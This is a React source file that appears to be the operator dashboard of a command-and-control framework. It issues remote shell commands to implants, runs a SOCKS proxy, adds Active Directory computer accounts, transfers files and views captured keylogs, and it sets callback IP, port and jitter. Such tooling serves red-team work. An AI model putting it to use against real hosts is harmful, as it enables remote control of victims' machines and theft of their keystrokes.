import React, { useEffect, useState, useContext, useRef } from 'react';
import { useAxios } from '../../context/AxiosProvider';
import AuthContext from '../../context/AuthProvider';
import { useLocation } from 'react-router-dom';
import './Agent.css';

const getCommandTypeOptions = (agentOSType) => {
  const osType = agentOSType.toLowerCase();
  const structuredOptions = [{ value: 'addcomputer', label: 'Add Computer' }];
  if (osType.includes('windows')) {
    return [
      { value: 'powershell', label: 'PowerShell' },
      { value: 'cmd', label: 'cmd' },
      { value: 'socks', label: 'Socks' },
      ...structuredOptions,
    ];
  }
  if (osType.includes('linux')) {
    return [
      { value: 'bash', label: 'bash' },
      { value: 'sh', label: 'sh' },
      { value: 'socks', label: 'Socks' },
      ...structuredOptions,
    ];
  }
  return [
    { value: 'shell', label: 'Shell' },
    { value: 'socks', label: 'Socks' },
    ...structuredOptions,
  ];
};

const ADD_COMPUTER_DEFAULTS = {
  target: '',
  method: 'SAMR',
  action: 'add',
  computer_name: '',
  computer_pass: '',
  base_dn: '',
  computer_group: '',
  domain_netbios: '',
};

const formatCommandForDisplay = (cmd) => {
  if (cmd.commandtype !== 'addcomputer') {
    return cmd.command;
  }

  try {
    const args = JSON.parse(cmd.command);
    const action = args.action || 'add';
    const method = args.method || 'SAMR';
    const name = args.computer_name || '(random name)';
    return `addcomputer ${action} ${name} via ${method}`;
  } catch {
    return cmd.command;
  }
};

const Agent = () => {
  const axios = useAxios();
  const { auth } = useContext(AuthContext);
  const [error, setError] = useState(null);

  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const initialLoadRef = useRef(true);
  const [activeTab, setActiveTab] = useState('commands');
  
  // States related to commands tab
  const [commands, setCommands] = useState([]);
  const [keylogs, setKeylogs] = useState([]);
  const [keylogRangeDays, setKeylogRangeDays] = useState(1);
  const [keylogTotal, setKeylogTotal] = useState(0);
  const [newCommand, setNewCommand] = useState('');
  const commandListRef = useRef(null);
  const [isAtBottom, setIsAtBottom] = useState(true);
  const prevCommandsRef = useRef([]);
  const [newCommandType, setCommandType] = useState('shell');
  const [addComputerForm, setAddComputerForm] = useState(ADD_COMPUTER_DEFAULTS);

  // States related to Configuration tab
  const [callbackIP, setCallbackIP] = useState('');
  const [callbackPort, setCallbackPort] = useState('');
  const [callbackFreq, setCallbackFreq] = useState('');
  const [callbackJitter, setCallbackJitter] = useState('');
  const [transportprotocol, setTransportProtocol] = useState('')
  const [saveError, setSaveError] = useState(null);
  const [isSaving, setIsSaving] = useState(false);

  // States related to Notes tab
  const [notes, setNotes] = useState('');
  const [notesError, setNotesError] = useState(null);
  const [isSavingNotes, setIsSavingNotes] = useState(false);

  const location = useLocation();
  const lockedTabs = ['configuration', 'notes'];

  // States related to Tags tab
  const [tags, setTags] = useState([]);
  const [newKey, setNewKey] = useState('');
  const [newValue, setNewValue] = useState('');
  const [now, setNow] = useState(Date.now());

  // States related to Files tab
  const [files, setFiles] = useState([]);
  const [fileUploadPath, setFileUploadPath] = useState('');
  const [fileToUpload, setFileToUpload] = useState(null);
  const [uploadError, setUploadError] = useState(null);
  const fileInputRef = useRef(null);
  const agentCapabilities = Array.isArray(data?.capabilities) ? data.capabilities : [];
  const hasKeylogger = agentCapabilities.includes('keylogger');

  const getQueryParam = (param) => {
    const searchParams = new URLSearchParams(location.search);
    return searchParams.get(param);
  };

  const fetchData = async () => {
    if (lockedTabs.includes(activeTab)) {
      return;
    }

    const wasInitialLoad = initialLoadRef.current;
    try {
      if (wasInitialLoad) {
        setLoading(true);
      }
      const queryParam = getQueryParam('agt');
      const agentResponse = await axios.get(`/api/agent/${queryParam}`);
      const commandsResponse = await axios.get(`/api/commands/${queryParam}`);
      const filesResponse = await axios.get(`/api/agents/files/list/${queryParam}`);
      const notesResponse = await axios.get(`/api/notes/${queryParam}`);
      const tagsResponse = await axios.get(`/api/tags/${queryParam}`);
      const tagsData = tagsResponse.data.tags;
      const responseData = agentResponse.data.data;

      if (responseData) {
        setData(responseData);
        setCallbackIP(responseData.serverip || '');
        setCallbackPort(responseData.serverport || '');
        setCallbackFreq(responseData.callbackfrequency || '');
        setCallbackJitter(responseData.callbackjitter || '');
        setTransportProtocol(responseData.transportprotocol || '');
      } else {
        setData(null);
      }

      if (commandsResponse.data.data) {
        const newCommands = commandsResponse.data.data;
  
        let commandsChanged = false;
  
        if (newCommands.length !== prevCommandsRef.current.length) {
          commandsChanged = true;
        } else {
          for (let i = 0; i < newCommands.length; i++) {
            if (
              newCommands[i].commanduuid !== prevCommandsRef.current[i].commanduuid ||
              newCommands[i].output !== prevCommandsRef.current[i].output
            ) {
              commandsChanged = true;
              break;
            }
          }
        }
  
        if (commandsChanged) {
          setCommands(newCommands);
          prevCommandsRef.current = newCommands;
        }
      } else {
        if (commands.length !== 0) {
          setCommands([]);
          prevCommandsRef.current = [];
        }
      }
      if (filesResponse.data.data){
        setFiles(filesResponse.data.data)
      } else {
        setFiles([])
      }
      if (activeTab === 'keys' && hasKeylogger) {
        fetchKeylogs(queryParam);
      }
      setNotes(notesResponse.data?.data?.note ?? '');
      if (Array.isArray(tagsData)) {
        setTags(tagsData);
      } else {
        setTags([]);
      }
    } catch (err) {
      setError(err.message);
    } finally {
      if (wasInitialLoad) {
        setLoading(false);
        initialLoadRef.current = false;
      }
    }
  };

  const fetchKeylogs = async (uuid) => {
    try {
      const nowIso = new Date().toISOString();
      const params = {
        uuid,
        sort: 'created_at:desc',
        limit: 200
      };
      if (keylogRangeDays > 0) {
        const start = new Date(Date.now() - keylogRangeDays * 24 * 60 * 60 * 1000).toISOString();
        params.start = start;
        params.end = nowIso;
      }
      const response = await axios.get('/api/opensearch/keylogs', { params });
      const hits = response?.data?.data || [];
      setKeylogTotal(response?.data?.total?.value || 0);
      setKeylogs(hits.map(hit => hit._source || {}));
    } catch (err) {
      setKeylogs([]);
      setKeylogTotal(0);
    }
  };
  
  const handleDownloadFile = async (fileId) => {
    try {
      const response = await axios.get(`/api/files/download/${fileId}`, {
        responseType: 'blob',
      });
  
      const contentDisposition = response.headers['content-disposition'];
      let filename = 'file';
  
      if (contentDisposition && contentDisposition.indexOf('attachment') !== -1) {
        const filenameMatch = contentDisposition.match(/filename=["']?([^"']+)["']?/);
        if (filenameMatch && filenameMatch[1]) {
          filename = filenameMatch[1];
        }
      }
  
      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', filename);
      document.body.appendChild(link);
      link.click();
    } catch (err) {
      console.error('Failed to download file:', err);
    }
  };
  
  const handleFileTransferRequest = async () => {
    try {
      const formData = new FormData();
      
      const transfertype = fileToUpload ? 'Download' : 'Upload';
      
      if (fileToUpload) {
        formData.append('file', fileToUpload);
      }
      
      formData.append('path', fileUploadPath);
      formData.append('uuid', getQueryParam('agt'));
      formData.append('transfertype', transfertype);
  
      await axios.post('/api/agents/files/upload', formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
      });
  
      if (fileInputRef.current) {
        fileInputRef.current.value = ''; 
      }
  
    } catch (err) {
      setUploadError('Failed to upload file');
    }
    setFileUploadPath('');
    setFileToUpload(null);
  };
  

  useEffect(() => {
    fetchData();
    const interval = setInterval(() => {
      fetchData();
    }, 5000);

    return () => clearInterval(interval);
  }, [location.search, activeTab]);

  useEffect(() => {
    initialLoadRef.current = true;
    setLoading(true);
  }, [location.search]);

  useEffect(() => {
    if (activeTab !== 'keys' || !hasKeylogger) return;
    const queryParam = getQueryParam('agt');
    if (!queryParam) return;
    fetchKeylogs(queryParam);
  }, [activeTab, keylogRangeDays, location.search, hasKeylogger]);

  useEffect(() => {
    if (!loading && data && activeTab === 'keys' && !hasKeylogger) {
      setActiveTab('commands');
    }
  }, [activeTab, data, hasKeylogger, loading]);

  useEffect(() => {
    const id = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const handleScroll = () => {
      if (!commandListRef.current) return;
  
      const { scrollTop, scrollHeight, clientHeight } = commandListRef.current;
      const isScrolledToBottom = scrollHeight - scrollTop - clientHeight <= 1;
  
      setIsAtBottom(isScrolledToBottom);
    };
  
    const commandListElement = commandListRef.current;
    if (commandListElement) {
      commandListElement.addEventListener('scroll', handleScroll);
    }
  
    return () => {
      if (commandListElement) {
        commandListElement.removeEventListener('scroll', handleScroll);
      }
    };
  }, []);   
  
  useEffect(() => {
    if (!commandListRef.current) return;
  
    if (isAtBottom) {
      commandListRef.current.scrollTop = commandListRef.current.scrollHeight;
    }
  }, [commands, isAtBottom]);  

  const handleSendCommand = async () => {
    try {
      const queryParam = getQueryParam('agt');
      const osType = data?.ostype?.trim() || tags.find((tag) => tag.key === 'os_type')?.value?.trim() || '';
      const options = getCommandTypeOptions(osType);
      const commandType = options.some((option) => option.value === newCommandType)
        ? newCommandType
        : options[0]?.value || 'shell';
      let commandBody;

      if (commandType === 'addcomputer') {
        if (addComputerForm.target.trim() === '') {
          setError('Target is required');
          return;
        }
        if (addComputerForm.action !== 'add' && addComputerForm.computer_name.trim() === '') {
          setError('Computer name is required for this action');
          return;
        }

        commandBody = {
          commandType,
          args: {
            ...addComputerForm,
            target: addComputerForm.target.trim(),
            computer_name: addComputerForm.computer_name.trim(),
            base_dn: addComputerForm.base_dn.trim(),
            computer_group: addComputerForm.computer_group.trim(),
            domain_netbios: addComputerForm.domain_netbios.trim(),
          },
        };
      } else {
        if (newCommand.trim() === '') {
          setError('Command cannot be empty');
          return;
        }

        commandBody = { commandType, command: newCommand };
      }

      await axios.post(`/api/command/${queryParam}`, commandBody);
      setNewCommand('');
      setAddComputerForm(ADD_COMPUTER_DEFAULTS);
      fetchData();
    } catch (err) {
      setError('Failed to send command');
    }
  };  

  const handleSaveConfiguration = async () => {
    try {
      setIsSaving(true);
      setSaveError(null);

      const queryParam = getQueryParam('agt');
      const updateBody = {
        serverip : callbackIP,
        serverport: callbackPort,
        callbackfreq: callbackFreq,
        callbackjitter: callbackJitter,
        transportprotocol: transportprotocol,
      };

      await axios.post(`/api/updateagent/${queryParam}`, updateBody, {
        headers: {
          Authorization: `Bearer ${auth.token}`,
        },
      });

      setIsSaving(false);
      fetchData();
    } catch (err) {
      setSaveError('Failed to save configuration');
      setIsSaving(false);
    }
  };

  if (error) {
    return <div>Error: {error}</div>;
  }

  if (loading) {
    return <p>Loading agent data...</p>;
  }

  if (!data) {
    return <p>No data available</p>;
  }

  const formatCountdown = (nextCallback) => {
    if (!nextCallback) return '—';

    const timestamp =
      typeof nextCallback === 'number'
        ? nextCallback * 1000
        : new Date(nextCallback).getTime();

    if (Number.isNaN(timestamp)) return '—';
    const delta = Math.floor((timestamp - now) / 1000);
    if (delta <= 0) return 'due';
    return `${delta}s`;
  };

  const agentUsername = data.username?.trim() || 'unknown';
  const agentHostname = data.hostname?.trim() || 'unknown';
  const agentIP = data.agentip?.trim() || '—';
  const agentOSType = data.ostype?.trim() || 'unknown';
  const agentOSBuild = data.osbuild?.trim() || 'unknown';
  const agentArch = data.arch?.trim() || 'unknown';
  const agentCPUs = data.cpus?.trim() || 'unknown';
  const agentMemory = data.memory?.trim() || 'unknown';
  const commandTypeOptions = getCommandTypeOptions(agentOSType);
  const effectiveCommandType = commandTypeOptions.some((option) => option.value === newCommandType)
    ? newCommandType
    : commandTypeOptions[0]?.value || 'shell';

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleSendCommand();
    }
  };

  const updateAddComputerField = (field, value) => {
    setAddComputerForm((current) => ({
      ...current,
      [field]: value,
    }));
  };

  const renderCommandInput = () => {
    if (effectiveCommandType === 'addcomputer') {
      return (
        <div className="structured-command-form">
          <div className="command-form-grid">
            <label>
              Target
              <input
                type="text"
                value={addComputerForm.target}
                onChange={(e) => updateAddComputerField('target', e.target.value)}
                placeholder="DOMAIN/user:pass@dc01.domain.local"
              />
            </label>
            <label>
              Action
              <select
                value={addComputerForm.action}
                onChange={(e) => updateAddComputerField('action', e.target.value)}
              >
                <option value="add">Add</option>
                <option value="set-password">Set password</option>
                <option value="delete">Delete</option>
              </select>
            </label>
            <label>
              Method
              <select
                value={addComputerForm.method}
                onChange={(e) => updateAddComputerField('method', e.target.value)}
              >
                <option value="SAMR">SAMR</option>
                <option value="LDAPS">LDAPS</option>
                <option value="LDAP">LDAP</option>
              </select>
            </label>
            <label>
              Computer name
              <input
                type="text"
                value={addComputerForm.computer_name}
                onChange={(e) => updateAddComputerField('computer_name', e.target.value)}
                placeholder={addComputerForm.action === 'add' ? 'Optional random name' : 'DESKTOP-TEST01'}
              />
            </label>
            {addComputerForm.action !== 'delete' && (
              <label>
                Computer password
                <input
                  type="text"
                  value={addComputerForm.computer_pass}
                  onChange={(e) => updateAddComputerField('computer_pass', e.target.value)}
                  placeholder="Optional random password"
                />
              </label>
            )}
            <label>
              Domain NetBIOS
              <input
                type="text"
                value={addComputerForm.domain_netbios}
                onChange={(e) => updateAddComputerField('domain_netbios', e.target.value)}
                placeholder="Optional"
              />
            </label>
            <label>
              Base DN
              <input
                type="text"
                value={addComputerForm.base_dn}
                onChange={(e) => updateAddComputerField('base_dn', e.target.value)}
                placeholder="DC=corp,DC=local"
              />
            </label>
            <label>
              Computer container
              <input
                type="text"
                value={addComputerForm.computer_group}
                onChange={(e) => updateAddComputerField('computer_group', e.target.value)}
                placeholder="CN=Computers"
              />
            </label>
          </div>
        </div>
      );
    }

    return (
      <input
        type="text"
        className="command-input"
        placeholder={
          effectiveCommandType === 'socks' ? 'Enter port|disable' : `Enter ${effectiveCommandType} command`
        }
        value={newCommand}
        onChange={(e) => setNewCommand(e.target.value)}
        onKeyDown={handleKeyPress}
      />
    );
  };

  const renderCommandsTab = () => (
    <div className="commands-list" ref={commandListRef}>
      {commands.length === 0 ? (
        <p>No commands available.</p>
      ) : (
        <ul>
          {commands.map((cmd) => (
            <li key={cmd.commanduuid}>
              <div>
                <strong>Command:</strong> {formatCommandForDisplay(cmd)}
              </div>
              <div>
                <strong>Output:</strong>
                <pre>{cmd.output !== '' ? cmd.output : 'Success (No output)'}</pre>
              </div>
            </li>
          ))}
        </ul>
      )}
      <div className="command-input-container">
        <select
          value={effectiveCommandType}
          onChange={(e) => setCommandType(e.target.value)}
          className="command-type-dropdown"
        >
          {commandTypeOptions.map((option) => (
            <option key={option.value} value={option.value}>
              {option.label}
            </option>
          ))}
        </select>

        {renderCommandInput()}
        <button onClick={handleSendCommand} className="send-command-button">
          Send
        </button>
      </div>
    </div>
  );  
  
  const renderFilesTab = () => {
    return (
      <div>
        <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
          <table>
            <thead>
              <tr>
                <th>File Path</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {files.map((file) => (
                <tr key={file.FileID}>
                  <td>{file.Path}</td>
                  <td>{file.Status}</td>
                  <td>
                    <button onClick={() => handleDownloadFile(file.FileID)}>
                      Download
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <h3>File Transfers</h3>
        <form onSubmit={(e) => { e.preventDefault(); handleFileTransferRequest(); }}>
          <div>
            <label>Path (with file name): </label>
            <input
              type="text"
              value={fileUploadPath}
              onChange={(e) => setFileUploadPath(e.target.value)}
              required
            />
          </div>
          <div>
            <label>File: </label>
            <input
              type="file"
              onChange={(e) => setFileToUpload(e.target.files[0])}
              ref={fileInputRef}
            />
          </div>
          <button type="submit">Request Transfer</button>
        </form>
        {uploadError && <p className="error">{uploadError}</p>}
      </div>
    );
  };

  const handleSaveNotes = async () => {
    try {
      setIsSavingNotes(true);
      setNotesError(null);

      const queryParam = getQueryParam('agt');
      const notesBody = { notes: notes };
      await axios.put(`/api/notes/${queryParam}`, notesBody);

      setIsSavingNotes(false);
    } catch (err) {
      setNotesError('Failed to save notes');
      setIsSavingNotes(false);
    }
  };

  const renderNotesTab = () => (
    <div className="notes-tab">
      <textarea
        value={notes}
        onChange={(e) => setNotes(e.target.value)}
        placeholder="Enter your notes here"
        rows={10}
        cols={50}
        disabled={isSavingNotes}
      />
      <button onClick={handleSaveNotes} disabled={isSavingNotes}>
        {isSavingNotes ? 'Saving...' : 'Save Notes'}
      </button>
      {notesError && <p className="error">{notesError}</p>}
    </div>
  );

  const renderKeylogsTab = () => (
    <div className="keylogs-list">
      <div className="keylogs-filters">
        <label htmlFor="keylogRange">Range</label>
        <select
          id="keylogRange"
          value={keylogRangeDays}
          onChange={(e) => {
            const next = Number(e.target.value);
            setKeylogRangeDays(next);
            const queryParam = getQueryParam('agt');
            if (activeTab === 'keys' && hasKeylogger && queryParam) {
              fetchKeylogs(queryParam);
            }
          }}
        >
          <option value={1}>Last 24 hours</option>
          <option value={7}>Last 7 days</option>
          <option value={30}>Last 30 days</option>
          <option value={0}>All time</option>
        </select>
        <span className="keylogs-meta">Total: {keylogTotal}</span>
      </div>
      {keylogs.length === 0 ? (
        <p>No keylogs available.</p>
      ) : (
        <ul>
          {keylogs.map((keylog) => {
            const formattedTime = new Date(keylog.created_at).toLocaleString();

            return (
              <li key={keylog.keylog_id || keylog.created_at}>
                <div className="keylog-entry">
                  <div className="keylog-meta">
                    <span className="keylog-time">{formattedTime}</span>
                  </div>
                  <div className="keylog-content">
                    {keylog.contents || "No keylogs recorded"}
                  </div>
                </div>
              </li>
            );
          })}
        </ul>
      )}
    </div>
  );

  const renderConfigurationTab = () => (
    <div className="configuration-tab">
        <h3>Agent Configuration</h3>
        <form>
            <div className="form-group">
                <label htmlFor="callbackIP">Callback IP</label>
                <input
                    type="text"
                    id="callbackIP"
                    value={callbackIP}
                    onChange={(e) => setCallbackIP(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackPort">Callback Port</label>
                <input
                    type="text"
                    id="callbackPort"
                    value={callbackPort}
                    onChange={(e) => setCallbackPort(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackFreq">Callback Frequency (seconds)</label>
                <input
                    type="number"
                    id="callbackFreq"
                    value={callbackFreq}
                    onChange={(e) => setCallbackFreq(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="callbackJitter">Callback Jitter (%)</label>
                <input
                    type="number"
                    id="callbackJitter"
                    value={callbackJitter}
                    onChange={(e) => setCallbackJitter(e.target.value)}
                    disabled={isSaving}
                />
            </div>
            <div className="form-group">
                <label htmlFor="transportprotocol">Transport Protocol</label>
                <select
                    id="transportprotocol"
                    value={transportprotocol}
                    onChange={(e) => setTransportProtocol(e.target.value)}
                    disabled={isSaving}
                >
                    <option value="TCP">TCP</option>
                    <option value="QUIC">QUIC</option>
                </select>
            </div>
            <button type="button" onClick={handleSaveConfiguration} disabled={isSaving}>
                {isSaving ? 'Saving...' : 'Save'}
            </button>
        </form>
        {saveError && <p className="error">{saveError}</p>}
    </div>
  );

  const handleAddTag = async (e) => {
    e.preventDefault();
    const queryParam = getQueryParam('agt');
    try {
      const newTag = {
        agents: [queryParam],
        key: newKey,
        value: newValue
      };

      const response = await axios.put('/api/tag', newTag);
      setTags([...tags, { tagid: response.data.tagid, key: newKey, value: newValue }]);
      setNewKey('');
      setNewValue('');
    } catch (error) {
      console.error("Error adding new tag:", error);
    }
  };

  const handleDeleteTag = async (tagId) => {
    try {
      const response = await axios.delete(`/api/tag/${tagId}`);
  
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      setTags(tags.filter(tag => tag.tagid !== tagId));
    } catch (error) {
      console.error('Error deleting tag:', error);
    }
  };
  

  const renderTagsTab = () => {
    return (
      <div className="tags-tab">
        <div className="tags-list">
          <table>
            <thead>
              <tr>
                <th>Key</th>
                <th>Value</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {tags.map(tag => (
                <tr key={tag.tagid}>
                  <td>{tag.key}</td>
                  <td>{tag.value || 'N/A'}</td>
                  <td>
                    <button onClick={() => handleDeleteTag(tag.tagid)}>Delete</button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        <div className="tags-form">
          <h3>Add / Modify Tags</h3>
          <form onSubmit={handleAddTag}>
            <div>
              <label>Key: </label>
              <input
                type="text"
                value={newKey}
                onChange={(e) => setNewKey(e.target.value)}
                required
              />
            </div>
            <div>
              <label>Value: </label>
              <input
                type="text"
                value={newValue}
                onChange={(e) => setNewValue(e.target.value)}
              />
            </div>
            <button type="submit">Add Tag</button>
          </form>
        </div>
      </div>
    );
  };
  
  return (
    <div className="agent-container">
        <div className="agent-header">
            <div className="agent-identity">
                {agentUsername}@{agentHostname}
            </div>
            <div className="agent-status">
                <div>Status: {data.status}</div>
                <div>Agent IP: {agentIP}</div>
                <div>Next Callback: {formatCountdown(data.nextcallback)}</div>
                <div>OS: {[agentOSType, agentOSBuild, agentArch].filter(Boolean).join(' ') || '—'}</div>
                <div>CPUs: {agentCPUs} Memory: {agentMemory}</div>
            </div>
        </div>
        <div className="agent-tabs">
            <div className="tabs">
                <button
                    className={activeTab === 'commands' ? 'active' : ''}
                    onClick={() => setActiveTab('commands')}
                >
                    Commands
                </button>
                <button
                    className={activeTab === 'files' ? 'active' : ''}
                    onClick={() => setActiveTab('files')}
                >
                    Files
                </button>
                {hasKeylogger && (
                    <button
                        className={activeTab === 'keys' ? 'active' : ''}
                        onClick={() => setActiveTab('keys')}
                    >
                        Keylogs
                    </button>
                )}
                <button
                    className={activeTab === 'configuration' ? 'active' : ''}
                    onClick={() => setActiveTab('configuration')}
                >
                    Configuration
                </button>
                <button
                    className={activeTab === 'notes' ? 'active' : ''}
                    onClick={() => setActiveTab('notes')}
                >
                    Notes
                </button>
                <button
                    className={activeTab === 'tags' ? 'active' : ''}
                    onClick={() => setActiveTab('tags')}
                >
                    Tags
                </button>
            </div>
  
            <div className="tab-content">
                {activeTab === 'commands' && renderCommandsTab()}
                {activeTab === 'files' && renderFilesTab()}
                {hasKeylogger && activeTab === 'keys' && renderKeylogsTab()}
                {activeTab === 'configuration' && renderConfigurationTab()}
                {activeTab === 'notes' && renderNotesTab()}
                {activeTab === 'tags' && renderTagsTab()}
            </div>
        </div>
    </div>
  );  
};

export default Agent;
